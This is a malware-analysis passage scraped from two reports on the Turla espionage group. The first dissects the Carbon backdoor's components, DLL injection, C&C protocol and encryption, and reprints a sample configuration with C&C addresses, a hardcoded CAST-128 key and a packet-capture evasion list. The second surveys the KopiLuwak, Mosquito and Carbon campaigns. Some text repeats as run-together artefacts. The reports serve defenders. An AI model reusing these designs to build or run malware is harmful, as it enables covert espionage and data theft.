Carbon, is installed on key systems.\\nTechnical analysis\\nCarbon is a sophisticated backdoor used to steal sensitive information from targets of interest by the Turla group.\\nThis malware shares some similarities with “Uroburos” 3, a rootkit used by the same group. The most relevant resemblance is the communication framework. Indeed, both of them provide communication channels between different malware components. The communication objects are implemented in the same way, the structures and vtables look identical except that there are fewer communication channels provided in Carbon. Indeed, Carbon might be a “lite” version of Uroburos (without kernel components and without exploits).\\nFor Turla group to decide to install Carbon on a system, a (stage 1) recognition tool is usually delivered first to the target: this tool collects several pieces of information about the victim’s machine and its network (through Tavdig or Skipper for example). If the target is considered interesting enough, it will receive more sophisticated malware (such as Carbon or Uroburos).\\nGlobal architecture\\nThe Carbon framework consists of:\\na dropper that installs the carbon components and its configuration file\\na component that communicates with the C&C\\nan orchestrator that handles the tasks, dispatches them to other computers on the network and injects into a legitimate process the DLL that communicates with the C&C\\na loader that executes the orchestrator\\nCarbon Dating\\nThe orchestrator and the injected library have their own development branch.\\nThanks to the compilation dates and the internal versions numbers hardcoded in the PE files, we might have the following timeline:\\nTable 1 – Carbon development timeline\\nCarbon files\\nThe files from the Carbon framework can have different names depending on the version but they all keep the same internal name (from the metadata) regardless of the version:\\nthe dropper: “SERVICE.EXE”\\nthe loader: “SERVICE.DLL” or “KmSvc.DLL”\\nthe orchestrator: “MSIMGHLP.DLL”\\nthe injected library: “MSXIML.DLL”\\nEach of these files exist in 32bit and in 64bit versions.\\nWorking directory\\nSeveral files are created by Carbon to keep logs, tasks to execute and configuration that will modify the malware’s behavior. The contents of the majority of these files are encrypted with the CAST-128 algorithm 4.\\nA base working directory will contain the files/folders related to Carbon. This directory is chosen randomly among the folders in %ProgramFiles% but excluding “WindowsApps”.\\nThe filenames are hardcoded in the orchestrator. The same names are used in the 3.7x+ branch. Because the injected library accesses the same files as the orchestrator, it is another easy way to link a library version and an orchestrator.\\nCarbon 3.7x files tree

working folder, when one is accessed by the malware, the following steps are taken:\\na specific mutex is used to ensure its exclusive access.\\nthe file is decrypted (CAST-128)\\nwhen the operations on the file are done, the file is reencrypted (CAST-128)\\nthe mutex is released\\nMutexes\\nThe following mutexes are created by the orchestrator in Carbon 3.7x:\\n“Global\\\\\\\\MSCTF.Shared.MUTEX.ZRX” (used to ensure exclusive access to “vndkrmn.dic”)\\n“Global\\\\\\\\DBWindowsBase” (used to ensure exclusive access to “C_56743.NLS”)\\n“Global\\\\\\\\IEFrame.LockDefaultBrowser” (used to ensure exclusive access to “b9s3coss.ax”)\\n“Global\\\\\\\\WinSta0_DesktopSessionMut” (used to ensure exclusive access to “a67ncodc.ax”)\\n“Global\\\\{5FA3BC02-920F-D42A-68BC-04F2A75BE158}” (used to ensure exclusive access to new files created in “Nls” folder)\\n“Global\\\\\\\\SENS.LockStarterCacheResource” (used to ensure exclusive access to “miniport.dat”)\\n“Global\\\\\\\\ShimSharedMemoryLock” (used to ensure exclusive access to “asmcerts.rs”)\\nIn carbon 3.8x, the filenames and the mutex names have changed:\\n“Global\\\\\\\\Stack.Trace.Multi.TOS” (used to ensure exclusive access to “preinsta.jpg”)\\n“Global\\\\\\\\TrackFirleSystemIntegrity” (used to ensure exclusive access to “dsntype.gif”)\\n“Global\\\\\\\\BitswapNormalOps” (used to ensure exclusive access to “cifrado.xml”)\\n“Global\\\\\\\\VB_crypto_library_backend” (used to ensure exclusive access to “encodebase.inf”)\\n“Global\\\\{E41B9AF4-B4E1-063B-7352-4AB6E8F355C7}” (used to ensure exclusive access to new files created in “0409” folder)\\n“Global\\\\\\\\Exchange.Properties.B” (used to ensure exclusive access to “wkstrend.xml”)\\n“Global\\\\\\\\DatabaseTransSecurityLock” (used to ensure exclusive access to “xmlrts.png”)\\nThese mutexes are also used in the injected dll to ensure that the orchestrator has been executed.\\nConfiguration File\\nThe configuration file affects the malware’s behavior. The file format is similar to “inf” files used by Windows. It contains among others:\\nan “object_id” that is a unique uuid used to identify the victim, when the value is not set in the file, it is generated randomly by the malware\\na list of processes into which code is injected (iproc)\\nthe frequency and time for task execution / backup logs / connection to the C&C (TIME)\\nthe IP addresses of other computers on the network (CW_LOCAL)\\nthe C&C server addresses (CW_INET)\\nthe named pipes used to communicate with the injected library and with the other computers (TRANSPORT)\\nThis file might be updated later.\\xa0Indeed, in the communication library, some cryptographic keys are used to encrypt/decrypt data and these keys are retrieved from a section CRYPTO in the configuration file that does not exist when the file is dropped from the loader resources.\\nCarbon 3.77 configuration file:\\nNAME\\nobject_id=\\niproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe\\nex = #,netscape.exe,mozilla.exe,adobeupdater.exe,chrome.exe\\nTIME\\nuser_winmin = 1800000\\nuser_winmax = 3600000\\nsys_winmin = 3600000\\nsys_winmax = 3700000\\ntask_min = 20000\\ntask_max = 30000\\ncheckmin = 60000\\ncheckmax = 70000\\nlogmin =\\n60000\\nlogmax = 120000\\nlastconnect=111\\ntimestop=\\nactive_con = 900000\\ntime2task=3600000\\nCW_LOCAL\\nquantity = 0\\nCW_INET\\nquantity = 3\\naddress1 = doctorshand.org:80:/wp-content/about/\\naddress2 = www.lasac.eu:80:/credit_payment/url/\\naddress3 = www.shoppingexpert.it:80:/wp-content/gallery/\\nTRANSPORT\\nsystem_pipe = comnap\\nspstatus = yes\\nadaptable = no\\nDHCP\\nserver = 135\\nLOG\\nlogperiod = 7200\\nWORKDATA\\nrun_task=\\nrun_task_system=\\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748\\nNAMEobject_id=iproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exeex = #,netscape.exe,mozilla.exe,adobeupdater.exe,chrome.exe\\xa0\\xa0TIMEuser_winmin = 1800000user_winmax = 3600000sys_winmin = 3600000sys_winmax = 3700000task_min = 20000task_max = 30000checkmin = 60000checkmax = 70000logmin =\\xa0\\xa060000logmax = 120000lastconnect=111timestop=active_con = 900000time2task=3600000\\xa0\\xa0CW_LOCALquantity = 0\\xa0CW_INETquantity = 3address1 = doctorshand.org:80:/wp-content/about/address2 = www.lasac.eu:80:/credit_payment/url/address3 = www.shoppingexpert.it:80:/wp-content/gallery/\\xa0TRANSPORTsystem_pipe = comnapspstatus = yesadaptable = no\\xa0\\xa0DHCPserver = 135\\xa0\\xa0LOGlogperiod = 7200\\xa0WORKDATArun_task=run_task_system=\\nLogfile\\nThe Carbon framework includes a logfile that is used to log actions performed by the malware and information on the system that can be useful to the malware operator (for example if an analysis tool such as WireShark is running on the machine).\\nThe log’s format has not changed since Carbon 3.71:\\nDate|Time|Object-Id|Source|Message\\nexample\\nLOG\\nstart=1\\n20/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|OPER|New object ID generated \\'8hTdJtUBB57ieReZAOSgUYacts\\'|\\n20/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|ST|3/81|0|\\n20/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|START OK\\n12345\\nLOGstart=120/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|OPER|New object ID generated \\'8hTdJtUBB57ieReZAOSgUYacts\\'|20/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|ST|3/81|0|20/02/17|12:48:24|8hTdJtUBB57ieReZAOSgUYacts|s|START OK\\nThis file is periodically backed up and sent to the C&C.\\nDropper\\nThe dropper is the only executable that is not a DLL. It is the first PE file to be executed: it is used to extract the other components from its resources.\\nThe PE files that are used to load the main components are extracted into the Windows system directory while the orchestrator, the library used to communicate with the C&C and the configuration file are extracted into the Carbon working directory.\\nA new section is appended into a random “.inf” file from %SystemRoot%\\\\INF. The section’s name is the volume serial disk number of the compromised machine and a value “root” is created with the chosen Carbon working directory.\\nExample:\\n5049654F\\nroot=\"C:\\\\Program Files\\\\Windows Portable Devices\"\\n12\\n5049654Froot=\"C:\\\\Program Files\\\\Windows Portable Devices\"\\nLoader\\nThis part of the component is used to load the orchestrator.\\nA service that ensures Carbon’s persistency is created. Its name can either be “srservice”, “ipvpn” or “hkmsvc” depending of the operating system version running on the compromised machine.\\nThe Carbon working directory is retrieved by walking through the “%windir%\\\\inf” folder and looking for the file that contains the Carbon base path.\\nLast but not least, the function “ModuleStart” (in Carbon 3.71) or “ModStart” (since Carbon 3.77) from the orchestrator (located in the Carbon base folder) is called.\\nOrchestrator\\nThe orchestrator is the main component of the Carbon framework. It is mainly used to inject code into a process that communicates legitimately over the Internet and to dispatch the tasks received from the injected library to other computers on the same network either through named pipes or TCP.\\nSeven threads are created by the malware. It is easy to identify Carbon’s characteristics because each thread has a specific role:\\nConfiguration fetching\\nBecause the configuration file can be updated by the malware, some attributes like the C&C server addresses are monitored every 10 minutes.\\nCheck Carbon storage folder periodically\\nThere is a storage folder located in the Carbon working directory. This folder contains some files downloaded from the C&C server (tasks that are either commands to be executed or PE files, and their configuration files).\\nThis thread will run continuously and check every two hours 5 whether there is still enough space available in this folder; if not, a notification is written into the logfile.\\nTask execution\\nThe execution of the tasks in the context of the orchestrator process is very similar to the way in which it is performed in the communication library (cf Communication library / Tasks execution).\\nUnlike the communication library, it is the file “encodebase.inf” (for Carbon v3.8x) or “a67ncode.ax” that contains the list of the tasks to execute.\\nEach line of this file is composed in the following way:\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath | execution_mode | username | password\\nThe five first fields are required, while the last three are optional. If the field “execution_mode” exists, its value will affect the way the task is executed:\\n0 or 1: normal execution\\n2: the task is executed in the security context of a specific user (credentials are provided through the username/password fields)\\n3 or 4: the task is executed in the security context of the user represented by the “explorer.exe” token\\nP2P\\nLike Uroburos/Snake, Carbon can dispatch tasks to other computers from the same network via named pipe or TCP. It is useful to be able to dispatch and execute tasks on computers that do not have Internet access.\\nCommunication channels\\nUroburos used several types of communication transports than can be categorized as follows:\\ntype 1: TCP\\ntype 2: enc, np, reliable, frag, m2b, m2d\\ntype 3: t2m\\ntype 4: UDP, doms, domc\\nCarbon uses a reduced number of communication channels:\\ntype 1: TCP, b2m\\ntype 2: np, frag, m2b\\nThe data sent to peers are usually fragmented and transported either by TCP or via a named pipe. If, for example, fragmented data are sent from a computer to another one by a named pipe, an object “frag.np” is set up. In this case the mother class “frag” constructor will be called followed by a call to the constructor subclass “np”.\\nThere is a structure composed of several handlers for each objects: initialize communication, connection (to a pipe / IP address), read data, send data etc.\\nHow a task is forwarded to another computer\\nSeveral steps are performed to send data from one computer to another:\\na communication channel is created (frag.np or frag.tcp object) with a specific named pipe / ip address\\noptions are given to the object communication (for example : the fragment’s size, information about the peer etc.)\\nconnection to the peer\\nan authentication step is performed between the host and the peer:\\nthere is a handshake process where the host is sending the “magic” value “A110EAD1EAF5FA11” and expects to receive “C001DA42DEAD2DA4” from the peer\\na command “WHO” is sent to the peer where the host sends the victim uuid and expects to receive the same uuid\\nif the authentication was successful, the data are sent to the peer\\nAll the communication between the host and the peer are encrypted with CAST-128\\nNote that this P2P feature is also implemented in the communication DLL.\\nPlugins\\nThis malware supports additional plugins to extend its functionalities.\\nIn the configuration file, there is a section named “PLUGINS”. It might not exist when the configuration file is dropped from the loader resources but this file can be updated by the malware. The section “PLUGINS” contains a line formed this way:\\n%plugin_name%=%enabled%|%mode%:%username%:%password%|%file_path%\\n%file_path% can be either the path to a PE file or to a file containing a command line to be executed. %enabled% is a string that is used to know if the plugin has to be executed. If it is the case, that string value is “enabled”.\\nThe attribute %mode% is used to control the context in which to execute the PE file/command line. It can be either:\\n1 = execution with current user privilege in the current process context through CreateProcess().\\n2 = execution as the user specified in the configuration (:%username%:%password% attributes), the token of this specific user is retrieved through the LogonUserAs() function.\\n3 = execution in the security context of the user represented by the “explorer.exe” token (the token of the process “explorer.exe” is duplicated and passed through the CreateProcessAsUser() function.\\n4 = similar than 3 but the environment variables for the user represented by the “explorer.exe” token are retrieved and passed to the function CreateProcessAsUser()\\nIf it is a PE file:\\nthe file is loaded into the malware process memory\\nthe module is parsed to check if it is a DLL\\nif the module is a DLL and exports a function “ModStart” (since Carbon 3.77) or “ModuleStart” (for older versions of Carbon), a new thread is created to execute this function.\\nif the module is not a DLL but a valid PE, it is executed from the entry point.\\nInjection of the communication library into remote processes\\nThe library that is used to communicate with the C&C server is injected into remote processes. In order to know where to inject this DLL, the configuration file is parsed. The section “NAME” contains a field “iproc” containing a list of processes that can legitimately communicate to Internet.\\nExample:\\nNAME\\niproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe\\n12\\nNAMEiproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe\\nFor each process on the list that is running on the system, if its parent process name is either “explorer.exe” or “ieuser.exe”, the DLL will be injected into this process.\\nThe process injection is very classical:\\nthe functions “CreateToolHelp32Snapshot / Module32FirstW / Module32NextW” are used to retrieve the base address of the module “kernel32.dll”\\nthe module EAT is parsed to get the address of the function “LoadLibraryW”\\nthe privilege “SeDebugPrivilege” is enabled for the current process\\nmemory is allocated into the remote process and the library path is written into it\\nNtCreateThreadEx or CreateRemoteThread (if the address of the first function cannot be retrieved) is called to execute LoadLibraryW to load the DLL into the memory of the remote process *\\nCommunication library\\nThe following analysis is based on the version 4.x of msximl. This component may have changed in the latest versions.\\nConfiguration fetching\\nBesides the code in the “Configuration fetching” thread from the orchestrator (which is similar), a field “sethttp1” is retrieved from the TRANSPORT section.\\nIf this value is set, HTTP 1.1 will be used for future connections.\\nTasks execution\\nThe tasks are retrieved from the C&C server.\\nThe tasks to be executed by the communication library are listed in the file “b9s3coff.ax” (for Carbon v3.7x) or “cifrado.xml” (for Carbon v3.8x).\\nEach line of this file is composed in the following way:\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath\\nThe task file and its config are decrypted (CAST-128) and the task executed. There are some options that are retrieved from the Carbon configuration file: “time2task” is used to set a timeout for the task execution (1 hour by default) while “task_min” and “task_max” are used as to wait a random time between the execution of the tasks on the task list (the random time will be set between “task_min” and “task_max”). These parameters come from the section TIME.\\nIf the task is a valid DLL file, it is loaded in the current process memory and a new thread is created to execute its “start” export. Otherwise, this is probably a command to execute. In this case, the configuration file is parsed. Like the Carbon configuration file, the task configuration file is formed as a windows “inf” file and should contain a section CONFIG with the following parameters:\\nCONFIG\\nNAME (“cmd.exe” by default)\\nARG\\nRESULT (“stdout” by default)\\nCOMPRESSION (“yes” by default)\\nDELETE (“no” by default)\\nThe command with its arguments is executed through CreateProcess() function and the results are stored in the %task_result_filepath% file if the RESULT option is not set to “stdout”, while error or additional info are added to the task logfile.\\nIf the option RESULT is set to stdout:\\nthe result task file is deleted and the task execution output is written to the log task file\\nthe line “task_id | “1” | task_log_filepath | object_id” is added at the end of the file “C_56743.NLS” (Carbon 3.7x) or “dsntype.gif” (Carbon 3.8x)\\nOtherwise:\\nthe task execution is outputted to the task result file and the errors / additional info to the task logfile\\nthe line “task_id | “2” | task_log_filepath | task_result_filepath | object_id” is added at the end of the file “C_56743.NLS” (Carbon 3.7x) or “dsntype.gif” (Carbon 3.8x)\\nIn both cases, the same line as written into “C_56743.NLS” is also written into the field “run_task” from the Carbon configuration file. It might be intended as a way for the malware authors to know which is the last task executed when the configuration file is sent to the C&C server (check “Configuration file backup”).\\nLog rotation\\nThe logfile is backed up and sent to the C&C server periodically (by default this is done every two hours).\\nLike the backup of the configuration file, this action is performed only during specific times of the day.\\nIndeed, the log rotation will be performed only when the current local time is in the range of what is defined in the configuration file.\\nThe fields “wh_min” and “wh_max” are retrieved from the TIME section of the configuration file (by default: 8 and 20). The thread will execute the code only if the current hour of the day is between %wh_min% and %wh_max%.\\nIf there is a value for the attribute “timestop” from the TIME section (which looks like “wDay:wMonth:wYear:wHour:wMinute”), the thread will execute the code only after this specific datetime.\\nThe attributes “lastsend” and “logperiod” from the LOG section are used to specify a delay time when to backup and send the log to the C&C server. (by default: every two hours).\\nA temporary file with a random name prefixed by “~D” is created in the folder “208” (for Carbon v3.7x) or “1033” (for Carbon v3.8x). The logfile content is copied into this new file. It is then compressed with Bzip2 and encrypted (CAST-128).\\nA new line is added at the end of the file “C_56743.NLS” (for Carbon v3.7x) or “dsntype.gif” (for Carbon v3.8x):\\n“10|1|%s|%s”\\n1st field: an ID to identify the file as a logfile\\n2nd field: 1 (file to be sent to the C&C server)\\n3rd field: the temp file path\\n4rd field: the victim uuid\\nLast but not least, the attribute “lastsend” is updated with the current time and the original logfile is deleted.\\nCommunication with the C&C server\\nThe code of this thread is used to retrieve new tasks from the C&C server, to send new files to the server (the files listed in the file “C_56743.NLS” / “dsntype.gif”) and to send the new tasks to the orchestrator.\\nFirst request\\nA random C&C server address is chosen from the ones in the section “CW_INET”. If the port and HTTP resource path are not specified, the default is to use port 80 and “/javascript/view.php”.\\nA user agent is set up in the following way:\\nthe version of Internet Explorer is retrieved through the registry key: “HKLM\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Version” and is concatenated to the string “Mozilla/4.0 (compatible; MSIE %d.0; ”\\nexample: “Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0;”\\nconcatenate the previous string with the OS major/minor version values (through GetVersionExA())\\n“Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0; Windows NT 5.1; Trident/4.0”\\nenumerate the values key in “HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Post Platform” and concatenate each value to the previous string and then append a closing paren.\\nexample: “Mozilla/4.0 (compatible; MSIE 8.0.6001.18702.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; Media Center PC 6.0; SLCC2)\\nThe field “trans_timemax” from the section TIME is retrieved. It is used to set the timeout for internet requests (through InternetSetOption()). It has a value of 10 minutes by default.\\nA first GET request is performed on the root page of the C&C web server to check that the host is alive. If no packet capture is running on the system, a new request is done on the C&C server to check if new tasks are available. A “PHPSESSID” cookie is added to the request with the victim uuid as its value. A header “Referer” is added as well and set to the C&C server URL.\\nThe malware is expecting to get an answer to the GET request similar to:\\n<input name=”%name%” value=”%data_in_b64%”>\\nIf the field “value” contains something, a new task is available.\\nSend data to the server\\nIf the file “C_56743.NLS” / “dsntype.gif” is not empty, it means there are data to be sent the C&C server. The file is parsed and the last line is retrieved. It contains details about the data to be sent. A data blob is built and each of the following fields is encrypted with CAST-128:\\nid | val | tmp_filesize | tmp_content | OPTIONAL (if val == 2) tmp2_filesize | tmp2_content | len_object_id | object_id\\nid = the type of data to send to the C&C server, it can be:\\n10: log backup\\n11: configuration file\\n20: a cryptographic key\\notherwise: an id associated to a task, it can be the result of a task or an error log in the case of task execution failure\\nval = 1 if there is only one file to send, 2 if there are two files\\nobject_id = the victim uuid\\nIf the field “dtc” from the section CRYPTO of the configuration file is set to 0, this whole blob is base64 encoded and sent to the C&C server through a POST request.\\nOtherwise, another layer of encryption is used. In this case, the data blob is signed and a random 3DES key is used to encrypt it. Because the 3DES key is randomly generated and the server needs it to decrypt the data, the key is encrypted with the server public key. The server key is retrieved from the field “publicc” of the section CRYPTO from the configuration file.\\nThis new blob (encrypted_key | signature_data | encrypted data) is encoded in base64 and sent to the C&C server through a POST request.\\nIn order to avoid detection based on the data size sent in a request, the blob can be fragmented into several packets. An option in the configuration file (“post_frag” in the section TRANSPORT) defines whether the blob will be fragmented or sent in only one POST request.\\nIf this option is set to “yes”, the blob is divided into several fragments of a specific size. This size comes from another field in the configuration file: “post_frag_size”.\\nAn additional header will be added to the request:\\n“Content-Range: bytes %u-%u/%u; id=%u\\\\r\\\\n”, i, i+(fragment_size-1), data_size, task_id”\\nIf the option http11 is set, a specific header is added as well:\\n“Expect: 100-continue\\\\r\\\\n”\\nFor each fragments sent, the fields “post_frag_size” and “pfslastset” from the config file (section CW_INET_RESULTS) are updated with the fragment size and the timestamp.\\nGet new tasks\\nNew tasks are retrieved from the C&C server by parsing the html page. The malware expects to find the html tag <input> in the page with a base64 encoded blob in its “value” attribute. Once decoded, this blob contains:\\nan encrypted block of 128 bytes that contains a structure “PUBLICKEYSTRUC” followed by a cryptographic key (probably a 3DES key)\\nsignature data (128 bytes) to verify the integrity of the next block\\na block of encrypted data that contains the task\\nThe malware uses an RSA private key (retrieved from the field “keypair” from the section CRYPTO of the configuration file) to decrypt the first block and then uses the freshly decrypted key to decrypt the third block. This block of data can be either:\\na task to be executed 6\\nthe data are decrypted and stored in few temporary files, the task (a command or a PE file) and its configuration file in the “Nls” folder and the output files (file that will contains the task results and the logfile) are stored in the folder “0208” (or respectively “0409” and “1033” for Carbon v3.8x)\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath\\nthis line is appended to beginning of the file “b9s3coff.ax” (cifrado.xml on v3.8x)\\na task to be executed by the orchestrator 7\\nthe data are decrypted and stored in few temporary files (the task, its configuration etc) in the “Nls” and “0208” folder (or “0409” and “1033” for Carbon v3.8x)\\ndepending of the content of the data, one of these lines will be added to the beginning of the file “a67ncode.ax” (encodebase.info on v3.8x)\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath | execution_mode | username | password\\ntask_id | task_filepath | task_config_filepath | task_result_filepath | task_log_filepath | execution_mode\\na new RSA server public key\\nin this case, the configuration file is updated with the new key encoded in base64 (field publicc)\\ndata to be sent to an instance of Carbon running in another computer in the same network\\nthe data can contains a specific IP address and port, a named pipe or a named pipe with a username and password.\\nCheck Internet availability\\nEach hour, the internet connection is checked. A first check is done by calling the function InternetAttemptConnect(). If it works, another test is done by sending HTTP GET requests to the following websites:\\nwww.google.com\\nwww.yahoo.com\\nwww.bing.com\\nupdate.microsoft.com\\nwindowsupdate.microsoft.com\\nmicrosoft.com\\nAn event is used to notify the other threads in case of the loss of Internet access.\\nConfiguration file backup\\nSimilar to the logfile, the configuration file is also periodically backed up and sent to the C&C server. The thread executes the code in a specific range of time (between 8h and 20h by default) 8.\\nThe value “configlastsend” is retrieved from the section TIME of the configuration file. If the config file has been sent over a month ago, the config file is copied into a temporary file with a random name prefixed by “~D” in the folder “208” (for Carbon v3.7x) or “1033” (for Carbon v3.8x). This file is then encrypted with CAST-128 algorithm.\\nTo notify the thread that communicates with the C&C server that a new file is ready to be sent to the server, the following line is appending to the file “C_56743.NLS” (for Carbon v3.7x) or “dsntype.gif” (for Carbon v3.8x):\\n“11|1|%s|%s”\\n1st field: an ID to identify the file as a config file\\n2nd field: 1 (file to be sent to the C&C server)\\n3rd field: the temp filepath\\n4rd field: the victim uuid\\nLast but not least, the attribute “configlastsend” is updated with the current time.\\nAdditional Notes\\nCalling API functions\\nThe base address of the modules of interest are retrieved by either parsing the PEB or (if the modules are not loaded into the process memory) by loading the needed files from disk into memory and parsing their headers to get their base addresses.\\nOnce the base addresses are retrieved, the PEB is walked again and the field “LoadCount” from the structure LDR_DATA_TABLE_ENTRY is checked. This value is used as a reference counter, to track the loading and unloading of a module.\\nIf “LoadCount” is positive, the module EAT is parsed to get the needed function address.\\nEncryption\\nThe module and function names are encrypted (at least since v3.77; it was not the case in v3.71) in a simple way, a logical shift of 1 bit being applied to each characters.\\nThe processes’ names are encrypted as well by just XOR’ing each character with the key 0x55 (for Carbon v3.7x at least since v3.77) and with the key 0x77 for Carbon v3.8x.\\nWith only a few the exceptions, each file from the Carbon working directory is encrypted with the CAST-128 algorithm in OFB mode. The same key and IV are used from the version 3.71 until the version 3.81:\\nkey = “\\\\x12\\\\x34\\\\x56\\\\x78\\\\x9A\\\\xBC\\\\xDE\\\\xF0\\\\xFE\\\\xFC\\\\xBA\\\\x98\\\\x76\\\\x54\\\\x32\\\\x10”\\nIV = “\\\\x12\\\\x34\\\\x56\\\\x78\\\\x9A\\\\xBC\\\\xDE\\\\xF0”\\nCheck if packet capture is running\\nBefore communicating with the C&C server or with other computers, the malware ensures that none of the most common packet capture software is running on the system:\\nTCPdump.exe\\nwindump.exe\\nethereal.exe\\nwireshark.exe\\nettercap.exe\\nsnoop.exe\\ndsniff.exe\\nIf any of these processes are running, no communication will be done.\\nCarbon IoCs are

Turla’s Fresh Faces\\nBy GReAT\\non October 4, 2018. 4:00 pm\\nTurla, also known as Venomous Bear, Waterbug, and Uroboros, may be best known for what was at the time an “ultra complex” snake rootkit focused on NATO-related targets, but their malware set and activity is much broader. Our current focus is on more recent and upcoming activity from this APT, which brings an interesting mix of old code, new code, and new speculations as to where they will strike next and what they will shed.\\nMuch of our 2018 research focused on Turla’s KopiLuwak javascript backdoor, new variants of the Carbon framework and meterpreter delivery techniques. Also interesting was Mosquito’s changing delivery techniques, customized PoshSec-Mod open-source powershell use, and borrowed injector code. We tied some of this activity together with infrastructure and data points from WhiteBear and Mosquito infrastructure and activity in 2017 and 2018.\\nFor a first, our KopiLuwak research identified targets and delivery techniques, bringing more accuracy and reliability to the discussion. Also interesting is a review of Turla scripting artefacts leading to newer efforts like KopiLuwak, tracing from older scripting in development efforts in WhiteAtlas and WhiteBear. And, we find 2018 KopiLuwak delivery techniques that unexpectedly matched Zebrocy spearphishing techniques for a first time as well.\\nAlso highly interesting and unusual was the MiTM techniques delivering Mosquito backdoors. In all likelihood, Turla delivered a physical presence of some sort within Wifi range of targets. Download sessions with Adobe’s website were intercepted and injected to deliver Mosquito trojanized installers. This sort of hypothesis is supported by Mosquito installers’ consistent wifi credential theft. Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements. We expect to see more Mosquito activity into 2019.\\nAnd finally, we discuss the Carbon framework, tying together the older, elegant, and functional codebase sometimes called “Snake lite” with ongoing efforts to selectively monitor high value targets. It appears that the backdoor is pushed with meterpreter now. And, as we see code modifications and deployment in 2018, we predict more development work on this matured codebase along with selective deployment to continue into 2019.\\nEssentially, we are discussing ongoing activity revolving around several malware families:\\nKopiLuwak and IcedCoffeer\\nCarbon\\nMosquito\\nWhiteBear\\nTechnical Rattle\\nTurla’s Shifting to Scripting\\nKopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas\\nSince at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors. The White Atlas framework often utilized a small Javascript script to execute the malware dropper payload after it was decrypted by the VBA macro code, then to delete the dropper afterwards. A much more advanced and highly obfuscated Javascript script was utilized in White Atlas samples that dropped a Firefox extension backdoor developed by Turla, but again the script was responsible for the simple tasks of writing out the extension.json configuration file for the extension and deleting itself for cleanup purposes.\\nIcedCoffee\\nTurla’s first foray into full-fledged Javascript backdoors began with the usage of the IcedCoffee backdoor that we reported on in our private June 2016 “Ice Turla” report (available to customers of Kaspersky APT Intelligence Services), which led later to their more fully functional and complex, recently deployed, KopiLuwak backdoor. IcedCoffee was initially dropped by exploit-laden RTF documents, then later by macro-enabled Office documents. The macro code used to drop IcedCoffee was a slightly modified version of that found in White Atlas, which is consistent with the code sharing present in many Turla tools. A noteworthy change to the macro code was the addition of a simple web beacon that relayed basic information to Turla controlled servers upon execution of the macro, which not only helped profile the victim but also could be used to track the effectiveness of the attack.\\nIcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server. IcedCoffee has no built-in command capability, instead it may receive javascript files from the C2 server, which are deobfuscated and executed in memory, leaving nothing behind on disk for forensic analysis. IcedCoffee was not widely deployed, rather it was targeted at diplomats, including Ambassadors, of European governments.\\nKopiLuwak\\nIn November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world). The targeting for this new malware was consistent with earlier Turla operations, focusing on European governments, but it was even more selectively deployed than IcedCoffee.\\nThe KopiLuwak script is decoded by macro code very similar to that previously seen with IcedCoffee, but the resulting script is not the final step. This script is executed with a parameter used as a key to RC4 decrypt an additional layer of javascript that contains the system information collection and command and control beaconing functionality. KopiLuwak performs a more comprehensive system and network reconnaissance collection, and like IcedCoffee leaves very little on disk for investigators to discover other than the base script.\\nUnlike IcedCoffee, KopiLuwak contains a basic set of command functionality, including the ability to run arbitrary system commands and uninstall itself. In mid-2017 a new version was discovered in which this command set had been further enhanced to include file download and data exfiltration capabilities.\\nThe most recent evolution in the KopiLuwak life cycle was observed in mid-2018 when we observed a very small set of systems in Syria and Afghanistan being targeted with a new delivery vector. In this campaign the KopiLuwak backdoor was encoded and delivered in a\\nWindows shortcut (.lnk) file. The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier.\\nCarbon – the long tail\\nCarbon continues to be deployed against government and foreign affairs related organizations in Central Asia. Carbon targeting in this region has shifted across a few countries since 2014. Here, we find a new orchestrator v3.8.2 and a new injected transport library v4.0.8 deployed to multiple systems. And while we cannot identify a concrete delivery event for the dropper, its appearance coincides with the presence of meterpreter. This meterpreter reliance also coincides with wider Turla use of open source tools that we documented towards the end of 2017 and beginning of 2018.\\nThe Epic Turla operation reported in 2014 involved highly selective Carbon delivery and was a long term global operation that affected hundreds of victims. Only a small portion of these systems were upgraded to a malware set known as “the Carbon framework”, and even fewer received the Snake rootkit for “extreme persistence”. So, Carbon is known to be a sophisticated codebase with a long history and very selective delivery, and coincides with Snake rootkit development and deployment. In light of its age, it’s interesting that this codebase is currently being modified, with additional variants deployed to targets in 2018.\\nWe expect Carbon framework code modifications and predict selective deployment of this matured codebase to continue into 2019 within Central Asia and related remote locations. A complex module like this one must require some effort and investment, and while corresponding loader/injector and lateral movement malware moves to open source, this backdoor package and its infrastructure is likely not going to be replaced altogether in the short term.\\n.JS attachments deliver Skipper/WhiteAtlas and WhiteBear\\nWe introduced 